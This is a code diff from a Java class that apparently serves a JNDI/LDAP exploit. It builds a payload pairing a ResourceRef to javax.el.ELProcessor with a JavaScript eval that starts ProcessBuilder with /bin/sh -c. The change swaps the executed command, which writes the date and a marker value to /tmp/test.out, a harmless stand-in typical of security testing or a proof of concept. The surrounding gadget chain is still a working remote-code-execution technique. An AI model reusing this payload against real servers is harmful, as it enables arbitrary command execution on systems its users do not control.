@@ -85,7 +85,7 @@ public class Application {
 
             String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
-                    ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/bin/date >> /tmp/test.out']).start()\")";
+                    ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','DATE=`/bin/date`; echo \\\"$DATE: " + base + "\\\" >> /tmp/test.out']).start()\")";
 
             entry.addAttribute("javaClassName", "java.lang.String");
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
